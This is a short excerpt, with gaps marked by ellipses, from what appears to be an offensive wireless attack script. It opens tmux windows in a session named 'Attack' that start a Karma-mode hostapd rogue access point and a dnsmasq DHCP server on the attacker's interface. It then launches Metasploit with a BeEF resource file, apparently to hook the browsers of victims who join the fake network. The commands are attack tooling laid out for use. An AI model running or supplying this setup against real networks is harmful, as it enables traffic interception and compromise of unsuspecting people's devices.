...
tmux new-window -tAttack:5 -n 'HostAPD' 'hostapd -dd $options /etc/hostapd.conf'
echo "Started Karma Hostapd"


#DHCP
cp conf/dnsmasq.conf conf/dnsmasq_tmp.conf
echo "interface=$lan" >> conf/dnsmasq_tmp.conf
killall dnsmasq
# -p 0 disables DNS functionality and leaves only the DHCP service
tmux new-window -tAttack:6 -n 'dhcp' 'dnsmasq -p 0 -d -C conf/dnsmasq_tmp.conf'
...
tmux new-window -tAttack:9 -n 'MSF' 'msfconsole -r bin/beef/beef.rc'
sleep 10
########################################################################################
